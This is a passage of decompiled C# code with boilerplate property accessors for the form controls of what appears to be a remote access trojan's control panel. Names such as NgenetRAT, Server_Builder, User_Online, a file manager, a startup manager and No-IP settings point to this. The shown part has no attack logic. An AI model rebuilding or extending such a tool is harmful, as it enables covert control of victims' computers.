		// (get) Token: 0x06000118 RID: 280 RVA: 0x00014F04 File Offset: 0x00013104
		// (set) Token: 0x06000119 RID: 281 RVA: 0x00002B89 File Offset: 0x00000D89
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x17000077 RID: 119
		// (get) Token: 0x0600011A RID: 282 RVA: 0x00014F1C File Offset: 0x0001311C
		// (set) Token: 0x0600011B RID: 283 RVA: 0x00002B92 File Offset: 0x00000D92
		internal virtual NumericUpDown Phight
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Phight;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Phight = value;
			}
		}

		// Token: 0x17000078 RID: 120
		// (get) Token: 0x0600011C RID: 284 RVA: 0x00014F34 File Offset: 0x00013134
		// (set) Token: 0x0600011D RID: 285 RVA: 0x00002B9B File Offset: 0x00000D9B
		internal virtual NumericUpDown Pwidth
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Pwidth;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Pwidth = value;
			}
		}

		// Token: 0x17000079 RID: 121
		// (get) Token: 0x0600011E RID: 286 RVA: 0x00014F4C File Offset: 0x0001314C
		// (set) Token: 0x0600011F RID: 287 RVA: 0x00002BA4 File Offset: 0x00000DA4
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x1700007A RID: 122
		// (get) Token: 0x06000120 RID: 288 RVA: 0x00014F64 File Offset: 0x00013164
		// (set) Token: 0x06000121 RID: 289 RVA: 0x00014F7C File Offset: 0x0001317C
		internal virtual CheckBox Sthmb
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Sthmb;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox1_CheckedChanged);
				if (this._Sthmb != null)
				{
					this._Sthmb.CheckedChanged -= value2;
				}
				this._Sthmb = value;
				if (this._Sthmb != null)
				{
					this._Sthmb.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x1700007B RID: 123
		// (get) Token: 0x06000122 RID: 290 RVA: 0x00014FD4 File Offset: 0x000131D4
		// (set) Token: 0x06000123 RID: 291 RVA: 0x00014FEC File Offset: 0x000131EC
		internal virtual System.Windows.Forms.Timer Timer3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer3_Tick);
				if (this._Timer3 != null)
				{
					this._Timer3.Tick -= value2;
				}
				this._Timer3 = value;
				if (this._Timer3 != null)
				{
					this._Timer3.Tick += value2;
				}
			}
		}

		// Token: 0x1700007C RID: 124
		// (get) Token: 0x06000124 RID: 292 RVA: 0x00015044 File Offset: 0x00013244
		// (set) Token: 0x06000125 RID: 293 RVA: 0x0001505C File Offset: 0x0001325C
		internal virtual CheckBox sthmb1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._sthmb1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.sthmb1_CheckedChanged);
				if (this._sthmb1 != null)
				{
					this._sthmb1.CheckedChanged -= value2;
				}
				this._sthmb1 = value;
				if (this._sthmb1 != null)
				{
					this._sthmb1.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x1700007D RID: 125
		// (get) Token: 0x06000126 RID: 294 RVA: 0x000150B4 File Offset: 0x000132B4
		// (set) Token: 0x06000127 RID: 295 RVA: 0x00002BAD File Offset: 0x00000DAD
		internal virtual SplitContainer SplitContainer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SplitContainer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SplitContainer2 = value;
			}
		}

		// Token: 0x1700007E RID: 126
		// (get) Token: 0x06000128 RID: 296 RVA: 0x000150CC File Offset: 0x000132CC
		// (set) Token: 0x06000129 RID: 297 RVA: 0x000150E4 File Offset: 0x000132E4
		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click);
				if (this._Button5 != null)
				{
					this._Button5.Click -= value2;
				}
				this._Button5 = value;
				if (this._Button5 != null)
				{
					this._Button5.Click += value2;
				}
			}
		}

		// Token: 0x1700007F RID: 127
		// (get) Token: 0x0600012A RID: 298 RVA: 0x0001513C File Offset: 0x0001333C
		// (set) Token: 0x0600012B RID: 299 RVA: 0x00015154 File Offset: 0x00013354
		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				if (this._Button4 != null)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				if (this._Button4 != null)
				{
					this._Button4.Click += value2;
				}
			}
		}

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x0600012C RID: 300 RVA: 0x000151AC File Offset: 0x000133AC
		// (set) Token: 0x0600012D RID: 301 RVA: 0x000151C4 File Offset: 0x000133C4
		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				if (this._Button3 != null)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				if (this._Button3 != null)
				{
					this._Button3.Click += value2;
				}
			}
		}

		// Token: 0x17000081 RID: 129
		// (get) Token: 0x0600012E RID: 302 RVA: 0x0001521C File Offset: 0x0001341C
		// (set) Token: 0x0600012F RID: 303 RVA: 0x00015234 File Offset: 0x00013434
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				if (this._Button2 != null)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				if (this._Button2 != null)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x06000130 RID: 304 RVA: 0x0001528C File Offset: 0x0001348C
		// (set) Token: 0x06000131 RID: 305 RVA: 0x000152A4 File Offset: 0x000134A4
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x06000132 RID: 306 RVA: 0x000152FC File Offset: 0x000134FC
		// (set) Token: 0x06000133 RID: 307 RVA: 0x00002BB6 File Offset: 0x00000DB6
		internal virtual Label Label9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label9 = value;
			}
		}

		// Token: 0x17000084 RID: 132
		// (get) Token: 0x06000134 RID: 308 RVA: 0x00015314 File Offset: 0x00013514
		// (set) Token: 0x06000135 RID: 309 RVA: 0x0001532C File Offset: 0x0001352C
		internal virtual ComboBox Comboape
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Comboape;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ComboBox1_SelectedIndexChanged);
				if (this._Comboape != null)
				{
					this._Comboape.SelectedIndexChanged -= value2;
				}
				this._Comboape = value;
				if (this._Comboape != null)
				{
					this._Comboape.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000085 RID: 133
		// (get) Token: 0x06000136 RID: 310 RVA: 0x00015384 File Offset: 0x00013584
		// (set) Token: 0x06000137 RID: 311 RVA: 0x0001539C File Offset: 0x0001359C
		internal virtual Button Button7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button7_Click);
				if (this._Button7 != null)
				{
					this._Button7.Click -= value2;
				}
				this._Button7 = value;
				if (this._Button7 != null)
				{
					this._Button7.Click += value2;
				}
			}
		}

		// Token: 0x17000086 RID: 134
		// (get) Token: 0x06000138 RID: 312 RVA: 0x000153F4 File Offset: 0x000135F4
		// (set) Token: 0x06000139 RID: 313 RVA: 0x0001540C File Offset: 0x0001360C
		internal virtual Button Button6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button6_Click);
				if (this._Button6 != null)
				{
					this._Button6.Click -= value2;
				}
				this._Button6 = value;
				if (this._Button6 != null)
				{
					this._Button6.Click += value2;
				}
			}
		}

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x0600013A RID: 314 RVA: 0x00015464 File Offset: 0x00013664
		// (set) Token: 0x0600013B RID: 315 RVA: 0x00002BBF File Offset: 0x00000DBF
		internal virtual Label Label7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label7 = value;
			}
		}

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x0600013C RID: 316 RVA: 0x0001547C File Offset: 0x0001367C
		// (set) Token: 0x0600013D RID: 317 RVA: 0x00002BC8 File Offset: 0x00000DC8
		internal virtual Label Label8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label8 = value;
			}
		}

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x0600013E RID: 318 RVA: 0x00015494 File Offset: 0x00013694
		// (set) Token: 0x0600013F RID: 319 RVA: 0x00002BD1 File Offset: 0x00000DD1
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x06000140 RID: 320 RVA: 0x000154AC File Offset: 0x000136AC
		// (set) Token: 0x06000141 RID: 321 RVA: 0x00002BDA File Offset: 0x00000DDA
		internal virtual Panel HPanel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HPanel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._HPanel1 = value;
			}
		}

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x06000142 RID: 322 RVA: 0x000154C4 File Offset: 0x000136C4
		// (set) Token: 0x06000143 RID: 323 RVA: 0x00002BE3 File Offset: 0x00000DE3
		internal virtual Panel HPanel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HPanel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._HPanel2 = value;
			}
		}

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x06000144 RID: 324 RVA: 0x000154DC File Offset: 0x000136DC
		// (set) Token: 0x06000145 RID: 325 RVA: 0x00002BEC File Offset: 0x00000DEC
		internal virtual Label Label10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label10 = value;
			}
		}

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x06000146 RID: 326 RVA: 0x000154F4 File Offset: 0x000136F4
		// (set) Token: 0x06000147 RID: 327 RVA: 0x00002BF5 File Offset: 0x00000DF5
		internal virtual Label Label11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label11 = value;
			}
		}

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x06000148 RID: 328 RVA: 0x0001550C File Offset: 0x0001370C
		// (set) Token: 0x06000149 RID: 329 RVA: 0x00002BFE File Offset: 0x00000DFE
		internal virtual Label Label12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label12 = value;
			}
		}

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x0600014A RID: 330 RVA: 0x00015524 File Offset: 0x00013724
		// (set) Token: 0x0600014B RID: 331 RVA: 0x00002C07 File Offset: 0x00000E07
		internal virtual Panel HPanel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HPanel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._HPanel3 = value;
			}
		}

		// Token: 0x17000090 RID: 144
		// (get) Token: 0x0600014C RID: 332 RVA: 0x0001553C File Offset: 0x0001373C
		// (set) Token: 0x0600014D RID: 333 RVA: 0x00002C10 File Offset: 0x00000E10
		internal virtual Label Label13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label13 = value;
			}
		}

		// Token: 0x17000091 RID: 145
		// (get) Token: 0x0600014E RID: 334 RVA: 0x00015554 File Offset: 0x00013754
		// (set) Token: 0x0600014F RID: 335 RVA: 0x00002C19 File Offset: 0x00000E19
		internal virtual Label Label15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label15 = value;
			}
		}

		// Token: 0x17000092 RID: 146
		// (get) Token: 0x06000150 RID: 336 RVA: 0x0001556C File Offset: 0x0001376C
		// (set) Token: 0x06000151 RID: 337 RVA: 0x00002C22 File Offset: 0x00000E22
		internal virtual CheckBox Cnoip
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Cnoip;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Cnoip = value;
			}
		}

		// Token: 0x17000093 RID: 147
		// (get) Token: 0x06000152 RID: 338 RVA: 0x00015584 File Offset: 0x00013784
		// (set) Token: 0x06000153 RID: 339 RVA: 0x0001559C File Offset: 0x0001379C
		internal virtual CheckBox Cnoip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Cnoip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Cnoip1_CheckedChanged);
				if (this._Cnoip1 != null)
				{
					this._Cnoip1.CheckedChanged -= value2;
				}
				this._Cnoip1 = value;
				if (this._Cnoip1 != null)
				{
					this._Cnoip1.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x17000094 RID: 148
		// (get) Token: 0x06000154 RID: 340 RVA: 0x000155F4 File Offset: 0x000137F4
		// (set) Token: 0x06000155 RID: 341 RVA: 0x0001560C File Offset: 0x0001380C
		internal virtual LinkLabel LinkLabelNoip
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabelNoip;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabelNoip_LinkClicked);
				if (this._LinkLabelNoip != null)
				{
					this._LinkLabelNoip.LinkClicked -= value2;
				}
				this._LinkLabelNoip = value;
				if (this._LinkLabelNoip != null)
				{
					this._LinkLabelNoip.LinkClicked += value2;
				}
			}
		}

		// Token: 0x17000095 RID: 149
		// (get) Token: 0x06000156 RID: 342 RVA: 0x00015664 File Offset: 0x00013864
		// (set) Token: 0x06000157 RID: 343 RVA: 0x0001567C File Offset: 0x0001387C
		internal virtual Button ButtonNoip
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ButtonNoip;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ButtonNoip_Click);
				if (this._ButtonNoip != null)
				{
					this._ButtonNoip.Click -= value2;
				}
				this._ButtonNoip = value;
				if (this._ButtonNoip != null)
				{
					this._ButtonNoip.Click += value2;
				}
			}
		}

		// Token: 0x17000096 RID: 150
		// (get) Token: 0x06000158 RID: 344 RVA: 0x000156D4 File Offset: 0x000138D4
		// (set) Token: 0x06000159 RID: 345 RVA: 0x00002C2B File Offset: 0x00000E2B
		internal virtual TextBox noipstatus
		{
			[DebuggerNonUserCode]
			get
			{
				return this._noipstatus;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._noipstatus = value;
			}
		}

		// Token: 0x17000097 RID: 151
		// (get) Token: 0x0600015A RID: 346 RVA: 0x000156EC File Offset: 0x000138EC
		// (set) Token: 0x0600015B RID: 347 RVA: 0x00002C34 File Offset: 0x00000E34
		internal virtual Label Label14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label14 = value;
			}
		}

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x0600015C RID: 348 RVA: 0x00015704 File Offset: 0x00013904
		// (set) Token: 0x0600015D RID: 349 RVA: 0x00002C3D File Offset: 0x00000E3D
		internal virtual TextBox PasswordTextBox
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PasswordTextBox;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PasswordTextBox = value;
			}
		}

		// Token: 0x17000099 RID: 153
		// (get) Token: 0x0600015E RID: 350 RVA: 0x0001571C File Offset: 0x0001391C
		// (set) Token: 0x0600015F RID: 351 RVA: 0x00002C46 File Offset: 0x00000E46
		internal virtual Label Label16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label16 = value;
			}
		}

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x06000160 RID: 352 RVA: 0x00015734 File Offset: 0x00013934
		// (set) Token: 0x06000161 RID: 353 RVA: 0x00002C4F File Offset: 0x00000E4F
		internal virtual TextBox UsernameTextBox
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UsernameTextBox;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._UsernameTextBox = value;
			}
		}

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x06000162 RID: 354 RVA: 0x0001574C File Offset: 0x0001394C
		// (set) Token: 0x06000163 RID: 355 RVA: 0x00002C58 File Offset: 0x00000E58
		internal virtual Label Label17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label17 = value;
			}
		}

		// Token: 0x1700009C RID: 156
		// (get) Token: 0x06000164 RID: 356 RVA: 0x00015764 File Offset: 0x00013964
		// (set) Token: 0x06000165 RID: 357 RVA: 0x00002C61 File Offset: 0x00000E61
		internal virtual TextBox HostTextBox
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HostTextBox;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._HostTextBox = value;
			}
		}

		// Token: 0x1700009D RID: 157
		// (get) Token: 0x06000166 RID: 358 RVA: 0x0001577C File Offset: 0x0001397C
		// (set) Token: 0x06000167 RID: 359 RVA: 0x00002C6A File Offset: 0x00000E6A
		internal virtual TabControl TabControl1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabControl1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabControl1 = value;
			}
		}

		// Token: 0x1700009E RID: 158
		// (get) Token: 0x06000168 RID: 360 RVA: 0x00015794 File Offset: 0x00013994
		// (set) Token: 0x06000169 RID: 361 RVA: 0x00002C73 File Offset: 0x00000E73
		internal virtual TabPage Client_Settings
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Client_Settings;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Client_Settings = value;
			}
		}

		// Token: 0x1700009F RID: 159
		// (get) Token: 0x0600016A RID: 362 RVA: 0x000157AC File Offset: 0x000139AC
		// (set) Token: 0x0600016B RID: 363 RVA: 0x00002C7C File Offset: 0x00000E7C
		internal virtual TabPage User_Logs
		{
			[DebuggerNonUserCode]
			get
			{
				return this._User_Logs;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._User_Logs = value;
			}
		}

		// Token: 0x170000A0 RID: 160
		// (get) Token: 0x0600016C RID: 364 RVA: 0x000157C4 File Offset: 0x000139C4
		// (set) Token: 0x0600016D RID: 365 RVA: 0x00002C85 File Offset: 0x00000E85
		internal virtual TabPage Port_Manager
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Port_Manager;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Port_Manager = value;
			}
		}

		// Token: 0x170000A1 RID: 161
		// (get) Token: 0x0600016E RID: 366 RVA: 0x000157DC File Offset: 0x000139DC
		// (set) Token: 0x0600016F RID: 367 RVA: 0x00002C8E File Offset: 0x00000E8E
		internal virtual TabPage User_Online
		{
			[DebuggerNonUserCode]
			get
			{
				return this._User_Online;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._User_Online = value;
			}
		}

		// Token: 0x170000A2 RID: 162
		// (get) Token: 0x06000170 RID: 368 RVA: 0x000157F4 File Offset: 0x000139F4
		// (set) Token: 0x06000171 RID: 369 RVA: 0x00002C97 File Offset: 0x00000E97
		internal virtual TabPage TabPage_0
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NgenetRAT;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NgenetRAT = value;
			}
		}

		// Token: 0x170000A3 RID: 163
		// (get) Token: 0x06000172 RID: 370 RVA: 0x0001580C File Offset: 0x00013A0C
		// (set) Token: 0x06000173 RID: 371 RVA: 0x00002CA0 File Offset: 0x00000EA0
		internal virtual TabPage Server_Builder
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Server_Builder;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Server_Builder = value;
			}
		}

		// Token: 0x170000A4 RID: 164
		// (get) Token: 0x06000174 RID: 372 RVA: 0x00015824 File Offset: 0x00013A24
		// (set) Token: 0x06000175 RID: 373 RVA: 0x00002CA9 File Offset: 0x00000EA9
		internal virtual TabPage About_me
		{
			[DebuggerNonUserCode]
			get
			{
				return this._About_me;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._About_me = value;
			}
		}

		// Token: 0x170000A5 RID: 165
		// (get) Token: 0x06000176 RID: 374 RVA: 0x0001583C File Offset: 0x00013A3C
		// (set) Token: 0x06000177 RID: 375 RVA: 0x00002CB2 File Offset: 0x00000EB2
		internal virtual ContextMenuStrip Menu1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Menu1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Menu1 = value;
			}
		}

		// Token: 0x170000A6 RID: 166
		// (get) Token: 0x06000178 RID: 376 RVA: 0x00015854 File Offset: 0x00013A54
		// (set) Token: 0x06000179 RID: 377 RVA: 0x00002CBB File Offset: 0x00000EBB
		internal virtual ToolStripSeparator ToolStripSeparator1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator1 = value;
			}
		}

		// Token: 0x170000A7 RID: 167
		// (get) Token: 0x0600017A RID: 378 RVA: 0x0001586C File Offset: 0x00013A6C
		// (set) Token: 0x0600017B RID: 379 RVA: 0x00002CC4 File Offset: 0x00000EC4
		internal virtual ToolStripMenuItem ManagerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ManagerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ManagerToolStripMenuItem = value;
			}
		}

		// Token: 0x170000A8 RID: 168
		// (get) Token: 0x0600017C RID: 380 RVA: 0x00015884 File Offset: 0x00013A84
		// (set) Token: 0x0600017D RID: 381 RVA: 0x0001589C File Offset: 0x00013A9C
		internal virtual ToolStripMenuItem FileManagerToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FileManagerToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FileManagerToolStripMenuItem1_Click);
				if (this._FileManagerToolStripMenuItem1 != null)
				{
					this._FileManagerToolStripMenuItem1.Click -= value2;
				}
				this._FileManagerToolStripMenuItem1 = value;
				if (this._FileManagerToolStripMenuItem1 != null)
				{
					this._FileManagerToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000A9 RID: 169
		// (get) Token: 0x0600017E RID: 382 RVA: 0x000158F4 File Offset: 0x00013AF4
		// (set) Token: 0x0600017F RID: 383 RVA: 0x0001590C File Offset: 0x00013B0C
		internal virtual ToolStripMenuItem ToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem3_Click);
				if (this._ToolStripMenuItem3 != null)
				{
					this._ToolStripMenuItem3.Click -= value2;
				}
				this._ToolStripMenuItem3 = value;
				if (this._ToolStripMenuItem3 != null)
				{
					this._ToolStripMenuItem3.Click += value2;
				}
			}
		}

		// Token: 0x170000AA RID: 170
		// (get) Token: 0x06000180 RID: 384 RVA: 0x00015964 File Offset: 0x00013B64
		// (set) Token: 0x06000181 RID: 385 RVA: 0x0001597C File Offset: 0x00013B7C
		internal virtual ToolStripMenuItem InstalledManagerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._InstalledManagerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.InstalledManagerToolStripMenuItem_Click);
				if (this._InstalledManagerToolStripMenuItem != null)
				{
					this._InstalledManagerToolStripMenuItem.Click -= value2;
				}
				this._InstalledManagerToolStripMenuItem = value;
				if (this._InstalledManagerToolStripMenuItem != null)
				{
					this._InstalledManagerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000AB RID: 171
		// (get) Token: 0x06000182 RID: 386 RVA: 0x000159D4 File Offset: 0x00013BD4
		// (set) Token: 0x06000183 RID: 387 RVA: 0x000159EC File Offset: 0x00013BEC
		internal virtual ToolStripMenuItem StartupManagerToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StartupManagerToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.StartupManagerToolStripMenuItem1_Click);
				if (this._StartupManagerToolStripMenuItem1 != null)
				{
					this._StartupManagerToolStripMenuItem1.Click -= value2;
				}
				this._StartupManagerToolStripMenuItem1 = value;
				if (this._StartupManagerToolStripMenuItem1 != null)
				{
					this._StartupManagerToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000AC RID: 172
		// (get) Token: 0x06000184 RID: 388 RVA: 0x00015A44 File Offset: 0x00013C44
		// (set) Token: 0x06000185 RID: 389 RVA: 0x00015A5C File Offset: 0x00013C5C
		internal virtual ToolStripMenuItem ToolStripMenuItem6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem6_Click);
				if (this._ToolStripMenuItem6 != null)
				{
					this._ToolStripMenuItem6.Click -= value2;
				}
				this._ToolStripMenuItem6 = value;
				if (this._ToolStripMenuItem6 != null)
				{
					this._ToolStripMenuItem6.Click += value2;
				}
			}
		}

		// Token: 0x170000AD RID: 173
